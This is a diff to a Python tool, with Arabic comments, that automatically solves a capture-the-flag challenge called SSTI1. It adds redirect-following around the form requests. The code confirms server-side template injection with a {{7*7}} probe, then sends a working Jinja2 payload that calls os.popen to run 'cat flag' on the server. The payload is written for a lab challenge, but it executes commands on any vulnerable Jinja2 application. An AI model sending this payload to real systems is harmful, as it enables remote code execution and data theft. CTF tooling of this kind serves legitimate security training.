@@ -35,7 +35,7 @@ from datetime import datetime, timezone
 from email.utils import parsedate_to_datetime
 from urllib.parse import urlsplit, urlencode, urljoin
 
-__version__ = "2.4.0"
+__version__ = "2.4.1"
 
 # --------------------------------------------------------------------------- #
 DEFAULT_FLAG_PATTERNS = [
@@ -506,6 +506,18 @@ def detect_ssti1(recon):
     return None
 
 
+
+def _request_ssti_form(client, method, url, body, record, note):
+    """Issue a form request and honor one same-origin 307/308 redirect."""
+    response = client.request(method, url, body=body)
+    record(response, [note])
+    if response["status"] in (307, 308) and response.get("location"):
+        redirected = urljoin(url, response["location"])
+        response = client.request(method, redirected, body=body)
+        record(response, [f"متابعة تحويل {response['status']} داخل أصل التحدي مع الحفاظ على POST."])
+    return response
+
+
 def solve_ssti1(client, origin, recon, ev, steps, bodies, record,
                 flag_patterns) -> dict:
     res = _base_result(origin, "SSTI1", "ssti1", recognized=True)
@@ -517,11 +529,11 @@ def solve_ssti1(client, origin, recon, ev, steps, bodies, record,
     endpoint = urljoin(origin, ev["action"])
     probe = urlencode({ev["field"]: "{{7*7}}"})
     try:
-        r = client.request("POST", endpoint, body=probe)
+        r = _request_ssti_form(client, "POST", endpoint, probe, record,
+                               "اختبار حسابي آمن داخل حقل النموذج المكتشف.")
     except (OSError, http.client.HTTPException, ValueError) as e:
-        res["warnings"].append(f"تعذّر اختبار النموذج: {e}.")
+        res["warnings"].append(f"تعذّر اختبار النموذج أو متابعة تحويله: {e}.")
         return res
-    record(r, ["اختبار حسابي آمن داخل حقل النموذج المكتشف."])
     evaluated = "49" in r["body"] and "{{7*7}}" not in r["body"]
     res["discovered"]["ssti_confirmed"] = evaluated
     if not evaluated:
@@ -533,11 +545,11 @@ def solve_ssti1(client, origin, recon, ev, steps, bodies, record,
     payload = "{{ cycler.__init__.__globals__.os.popen('cat flag').read() }}"
     body = urlencode({ev["field"]: payload})
     try:
-        r2 = client.request("POST", endpoint, body=body)
+        r2 = _request_ssti_form(client, "POST", endpoint, body, record,
+                                "إرسال تعبير Jinja2 المعروف لتحدي SSTI1، وقراءة ملف flag في مجلد التحدي.")
     except (OSError, http.client.HTTPException, ValueError) as e:
         res["warnings"].append(f"تعذّرت قراءة ملف العلم المتوقع في تحدي SSTI1: {e}.")
         return res
-    record(r2, ["إرسال تعبير Jinja2 المعروف لتحدي SSTI1، وقراءة ملف flag في مجلد التحدي."])
     flag, source = extract_flag([(f"step{len(steps)}:response", r2["body"])], flag_patterns)
     if flag and 200 <= r2["status"] < 300:
         res["success"], res["flag"] = True, flag
